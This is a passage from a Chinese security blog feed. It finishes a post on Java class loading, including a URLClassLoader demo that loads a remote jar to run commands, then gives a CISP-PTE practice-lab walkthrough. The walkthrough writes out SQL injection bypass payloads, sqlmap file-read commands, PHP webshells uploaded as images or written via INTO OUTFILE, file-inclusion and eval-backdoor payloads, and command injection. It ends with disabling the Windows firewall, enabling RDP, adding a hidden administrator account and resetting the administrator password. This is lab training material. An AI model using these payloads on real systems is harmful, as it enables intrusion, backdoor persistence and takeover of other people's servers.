class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       c = findBootstrapClassOrNull(name);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                   <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                   <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                   <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                   <span class="comment">// to find the class.</span></span><br><span class="line">                   <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                   c = findClass(name);</span><br><span class="line"></span><br><span class="line">                   <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                   sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                   sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                   sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">               resolveClass(c);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> c;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>





<h3 id="findClass"><a href="#findClass" class="headerlink" title="findClass"></a>findClass</h3><p>在自定义类加载器时，一般会覆盖掉这个方法， 当覆盖掉这个类时程序会调用我们写的类。</p>
<p>代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>该方法将字节解析成虚拟机能够识别的Class对象。通常来说，defineClass()方法与findClass()一起使用。</p>
<p>代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">       <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h3 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h3><p>连接指定的类，类加载器可以使用此方法来连接类</p>
<h2 id="ClassLoader类加载流程"><a href="#ClassLoader类加载流程" class="headerlink" title="ClassLoader类加载流程"></a>ClassLoader类加载流程</h2><p>这里简单写个java程序，代码如下；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">helloworld</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello world!!!!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>加载流程；</p>
<ul>
<li>ClassLoader调用loadClass()方法加载helloworldle类，调用findloadedClass方法检查helloworld类是否已经初始化，如果JVM初始化过该类就直接返回类对象。</li>
<li>如果当前类加载器传入父类加载器加载类加载类失败，就调用自身的findClass方法尝试加载helloworld类</li>
<li>如果当前类加载器重写了findClass方法并通过传入的类名找到了类字节码，调用defineClass方法在JVM中注册该类。否则返回类加载失败异常。</li>
<li>如果调用loaderClass的时候传入的resolve参数为true,还需要调用resolveClass方法链接类，默认为false.</li>
<li>返回一个被JVM加载后的java.lang.Class对象</li>
</ul>
<h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>在java.net包中，JDK提供了一个易用的继承了ClassLoader的类加载器URLClassLoader类。</p>
<p>URLClassLoader提供了加载远程资源的能力，在一些远程利用接口下可以调用该类来加载jar实现RCE。</p>
<p>构造方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URLClassLoader</span><span class="params">(URL[] urls)</span> </span></span><br><span class="line"><span class="function"><span class="comment">//指定要加载的类所在的URL地址，父类加载器默认为系统类加载器。</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URLClassLoader</span><span class="params">(URL[] urls, ClassLoader parent)</span></span></span><br><span class="line"><span class="function"><span class="comment">//指定要加载的类所在的URL地址，并指定父类加载器。</span></span></span><br></pre></td></tr></table></figure>



<p>Demo代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestURLClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义远程加载的jar路径</span></span><br><span class="line">            URL url = <span class="keyword">new</span> URL(<span class="string">&quot;https://javaweb.org/tools/cmd.jar&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            URLClassLoader ucl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">            <span class="comment">// 定义需要执行的系统命令</span></span><br><span class="line">            String cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">            <span class="comment">// 通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            Class cmdClass = ucl.loadClass(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">            <span class="comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span></span><br><span class="line">            Process process = (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="keyword">null</span>, cmd);</span><br><span class="line">            <span class="comment">// 获取命令执行结果的输入流</span></span><br><span class="line">            InputStream           in   = process.getInputStream();</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span>[]                b    = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span>                   a    = -<span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 读取命令执行结果</span></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>加载的jar文件源代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line">publicclass CMD &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将该代码编译后打包成jar包放在本机服务器上。</p>
<p>代码运行如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">README.md</span><br><span class="line">gitbook</span><br><span class="line">javaweb-sec-source</span><br><span class="line">javaweb-sec.iml</span><br><span class="line">jni</span><br><span class="line">pom.xml</span><br></pre></td></tr></table></figure>





<h2 id="类动态加载方式"><a href="#类动态加载方式" class="headerlink" title="类动态加载方式"></a>类动态加载方式</h2><p>Java类加载方式分为显式和隐式。</p>
<p>显式就是我们通常使用的Java反射和ClassLoader来动态加载一个类对象，而隐式指的是类名.方法名()或new 类实例。显式类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。</p>
<p>常用类动态加载方式:</p>
<ul>
<li>Class.forName(“类名“)      默认初始化被加载类的静态属性和方法</li>
<li>Class.forName(“类名 “,是否初始化类，类加载器)      不初始化类</li>
<li>Class.loadClass  默认不会初始化方法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//反射加载helloworld示例:</span><br><span class="line">Class.forName(&quot;com.Classloader.helloWorld&quot;);</span><br><span class="line"></span><br><span class="line">//ClassLoader加载helloworld示例；</span><br><span class="line">this.getClass().getClassLoader().loadClass(&quot;com.Classloader.helloWorld&quot;);</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>代码审计</category>
        <category>java</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-Java基础 -ClassLoader类加载 -代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Cisp-pte靶场练习</title>
    <url>/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Cisp-pte靶场练习"><a href="#Cisp-pte靶场练习" class="headerlink" title="Cisp-pte靶场练习"></a>Cisp-pte靶场练习</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626194244620.png" class title="image-20220626194244620">



<p>首先我们先对查询字段数进行判断，使用order by进行查看，可发现将空格和#字符进行了过滤。</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626194357072.png" class title="image-20220626194357072">



<p>将空格和#使用其他进行代替尝试绕过。使用 &#x2F;**&#x2F;  或者    &#x2F;*!*&#x2F;代替空格，%23代替#号.当字段大于4时查询失败，判读查询字段为4</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626200144818.png" class title="image-20220626200144818">



<p>这里也过滤了union，使用双写大小写来绕过。接着判断回显字段、</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;)/*!*/uniunionon/*!*/select/*!*/1,2,3,4%23</span><br></pre></td></tr></table></figure>

<p>回显字段为2.3.4，所以对这三个字段输入查询语句</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626200653950.png" class title="image-20220626200653950">



<p>这里可以通过几种方法获取key值，使用load_file()函数读取文件，写一句话木马到Web路径下，获取数据库账号密码信息等</p>
<p>首先我们使用load_file()函数来读取文件，前提是该数据库设置属性允许读写文件，获取key值为key{8b3h4a7v }。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;)/*!*/uniunionon/*!*/select/*!*/1,database(),version(),load_file(&#x27;/tmp/360/key&#x27;)#</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626201650989.png" class title="image-20220626201650989">



<p>接下来我们在写一句话木马，可发现语句被过滤啦</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626202454053.png" class title="image-20220626202454053">



<p>最后我们可通过information_schema数据表中tables、columns表来逐个获取账号密码信息，通过登录mysql数据库写入一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;)/*!*/uniunionon/*!*/select/*!*/1,(select/*!*/group_concat(table_name)/*!*/from/**/information_schema.tables/**/where/**/table_schema=&#x27;2web&#x27;),database(),(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;article&#x27;)%23</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626203634439.png" class title="image-20220626203634439">

<p>可发现数据库并无账号密码信息</p>
<p><strong>SQLMAP工具使用</strong></p>
<p>判断注入点为id并且数据库为Mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://192.168.58.128:81/vulnerabilities/fu1.php?id=1&quot;</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626205159051.png" class title="image-20220626205159051">





<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://192.168.58.128:81/vulnerabilities/fu1.php?id=1&quot; --file-read=/tmp/360/key --tamper &quot;space2hash.py&quot;</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626204852197.png" class title="image-20220626204852197">



<p>访问指定文件获取key值</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626205709776.png" class title="image-20220626205709776">



<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h2 id="日志分析-暴力破解"><a href="#日志分析-暴力破解" class="headerlink" title="日志分析+暴力破解"></a>日志分析+暴力破解</h2><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626125937213.png" class title="image-20220626125937213">

<p>首先将一句话<?php eval($_GET['a'])?>上传后文件不存在，将函数修改为asset等函数和修改后缀拓展名为php3、php5等不常用后缀都未上传成功，判断服务器对上传文件进行了头部检测和常用危险函数(eval、asset)过滤。</p>
<p>尝试上传图片文件，显示上传文件有效并且返回上传图片路径</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626130620141.png" class title="image-20220626130620141">

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626130704030.png" class title="image-20220626130704030">



<p>所以我们可以上传图片马和添加图片头文件GIF89a来绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> readfile(<span class="string">&#x27;../key.php&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#&lt;?php highlight_file(&#x27;../key.php&#x27;)&gt;</span></span><br><span class="line"><span class="comment">#&lt;?php echo file_get_contents(&#x27;../key.php&#x27;);?&gt;</span></span><br><span class="line"><span class="comment">#&lt;?php system($_REQUEST[&#x27;a&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure>



<p>通过burp拦截请求包并修改mime类型为image&#x2F;jpg，这里还需对上传文件后缀名称修改为php3或php5等非php后缀才可上传成功。</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626131322456.png" class title="image-20220626131322456">



<p>在浏览器中访问上传文件test.php3</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626131412994.png" class title="image-20220626131412994">



<p>查看页面源代码得到key值，为key{8t5s0x5t}</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626131459715.png" class title="image-20220626131459715">



<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626132052310.png" class title="image-20220626132052310">



<p>可以看到URL地址中参数file为view.html，尝试修改参数为系统文件&#x2F;etc&#x2F;passwd文件，读取成功，存在本地文件读取。</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626132306870.png" class title="image-20220626132306870">



<p>尝试读取key.php文件，失败</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626132434791.png" class title="image-20220626132434791">



<p>尝试远程文件包含，将file参数修改为远程服务器上文件，如文件上传中的test.php3文件，读取成功但未显示key值</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626132729807.png" class title="image-20220626132729807">



<p>尝试php伪协议读取文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hackbar:file=php:<span class="comment">//input</span></span><br><span class="line">post data:</span><br><span class="line"><span class="meta">&lt;?php</span> highlight_file(<span class="string">&#x27;../key.php&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#&lt;?php echo file_get_contents(&#x27;../key.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如下读取成功,key值为key{6u3x9t2p}</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626134712008.png" class title="image-20220626134712008">

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626134811730.png" class title="image-20220626134811730">



<p>尝试base64编码读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=../key.php</span><br></pre></td></tr></table></figure>

<p>读取成功，key值key{R2V0IGl0IQ0KPD9waHANCg0KLy9rZXk6NnUzeDl0MnANCj8+ }</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626135248118.png" class title="image-20220626135248118">

<h2 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含+"></a>文件包含+</h2><img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626135530005.png" class title="image-20220626135530005">



<p>这道题和前面的文件包含不一样，没有参数传递，我们查看页面源代码，对POST请求中参数进行正则匹配代替为如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@$a = $_POST[&#x27;Hello&#x27;]; </span><br><span class="line">if(isset($a))&#123; </span><br><span class="line">@preg_replace(&quot;/\[(.*)\]/e&quot;,&#x27;\\1&#x27;,base64_decode(&#x27;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&#x27;)); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626135831208.png" class title="image-20220626135831208">

<p>其中Base64编码解码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[@eval(base64_decode($_POST[z0]));]</span><br></pre></td></tr></table></figure>



<p>所以需要将a进行赋值和对z0进行Base64编码后进行传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello=aaa&amp;z0=c3lzdGVtKCdjYXQgLi4va2V5LnBocCcpOw==</span><br><span class="line">#zo参数为system(&#x27;cat ../key.php&#x27;);</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626141220758.png" class title="image-20220626141220758">



<p>查看源代码获取key值，key{6u3x9t2p}</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626143129377.png" class title="image-20220626143129377">



<h2 id="文件包含-2"><a href="#文件包含-2" class="headerlink" title="文件包含++"></a>文件包含++</h2><img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626144511329.png" class title="image-20220626144511329">



<p>查看其源代码。可发现一段PHP代码，这段代码的意思是对请求参数cmd进行判断存在并且计算其长度，满足后方可执行exec函数执行命令，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;cmd&#x27;]) &amp;&amp; strlen($_GET[&#x27;cmd&#x27;]) &lt;=30)</span><br><span class="line">&#123; @exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626144726561.png" class title="image-20220626144726561">



<p>构造payload来寻找key.php文件位置在上一级目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$cmd=ls ../&gt;b.txt</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626151956672.png" class title="image-20220626151956672">



<p>构造payload来读取key.php文件获取key值,key{6u3x9t2p}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$cmd=cat ../key.php&gt;a.txt</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626152131866.png" class title="image-20220626152131866">



<h2 id="综合环境"><a href="#综合环境" class="headerlink" title="综合环境"></a>综合环境</h2><p>访问靶场Web环境，首先弹出个认证弹窗，可拦截登录请求对认证字段进行爆破</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626153704424.png" class title="image-20220626153704424">



<p>使用burp拦截选取Authorization字段使用intruder中迭代器选取字典，并对其进行Base64加密爆破，如下</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626153934729.png" class title="image-20220626153934729">

<p>Base64解码后得admin:123456</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626154019009.png" class title="image-20220626154019009">



<p>登陆成功，为一个DedeCms网站，由于网站页面设置了验证码不可长时间爆破，所以对其进行Web扫描。</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626154130196.png" class title="image-20220626154130196">



<p>发现两个重定向目录，&#x2F;dede&#x2F;和&#x2F;phpmyadmin&#x2F;</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626154618410.png" class title="image-20220626154618410">



<p>访问&#x2F;dede&#x2F;后台，尝试弱口令或者爆破账号密码</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626154738303.png" class title="image-20220626154738303">



<p>使用弱口令admin&#x2F;888888登录成功，可通过多种方法对织梦管理系统写马获取权限</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626154858979.png" class title="image-20220626154858979">



<p>下面访问phpadmin数据库管理后台，使用弱口令root&#x2F;root登录</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626155536820.png" class title="image-20220626155536820">



<p>前面我们通过弱口令进入了织梦后台管理系统，若管理员设置了强密码我们需从其他地方获取或者修改账号密码进行后台登陆。此时我们进入Phpmyadmin后，寻找存储Dedecms管理员账号密码的数据表信息。</p>
<p>查询到Dedecms的管理员账号以及密码MD5值</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626161401183.png" class title="image-20220626161401183">



<p>对密码MD5爆破解密为888888</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626161528581.png" class title="image-20220626161528581">



<p>由于该密码过于简单，若管理员设置了强密码，短时间内可能爆破不出来密码，只可自己生成密码MD5值对其进行修改。</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626162001475.png" class title="image-20220626162001475">



<p>修改成功，后台账号密码为admin&#x2F;123456</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626162050745.png" class title="image-20220626162050745">



<p>接下来我们就利用SQL语句来写木马文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &#x27;c:/phpstudy/www/shell.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>文件写入成功</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626162419358.png" class title="image-20220626162419358">



<p>我们在浏览器中测试一下，命令执行成功</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626174536870.png" class title="image-20220626174536870">



<p>我们利用菜刀或者蚁剑来访问该文件获取服务器权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://admin:123456@192.168.58.129/hyq.php</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626173038043.png" class title="image-20220626173038043">



<p>获取根目录下key文件，key2值为key{u8i9o0p6}</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626173106125.png" class title="image-20220626173106125">



<p>接下来我们需要连接远程桌面获取回收站中的key值</p>
<p>首先判断目标主机是否开放3389端口，只开放80端口</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626174444489.png" class title="image-20220626174444489">



<p>所以我们需要手工开启目标主机3389端口，在这之前需要关闭防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win2003:</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line"></span><br><span class="line">win2008:</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626191249365.png" class title="image-20220626191248011">



<p>随后将3389.bat上传至目标主机上</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626191508609.png" class title="image-20220626191508609">



<p>在虚拟终端中执行3389.bat文件开启3389端口服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3389.bat</span><br></pre></td></tr></table></figure>

<p>目标主机3389端口开启</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626191817297.png" class title="image-20220626191817297">



<p>使用远程桌面需要输入管理员账号密码，所以尝试创建新用户root加入管理员组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user root toor12345 /add</span><br><span class="line">net localgroup administrators root /add</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626192043145.png" class title="image-20220626192043145">



<p>在命令提示符中输入mstsc打开远程连接工具，输入目标主机ip地址和上面新建的用户账号密码，登录成功</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626192353936.png" class title="image-20220626192353936">



<p>可以看到登录了用户root的远程左面，并无任何应用以及文件，无法获取到key值</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626192541965.png" class title="image-20220626192541965">



<p>由于key值文件在管理员administrator用户的桌面上，所以需要获取或者修改该用户的密码，这里采用在命令行中直接修改用户administrator的密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user administrator admin12345</span><br></pre></td></tr></table></figure>

<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626192948891.png" class title="image-20220626192948891">



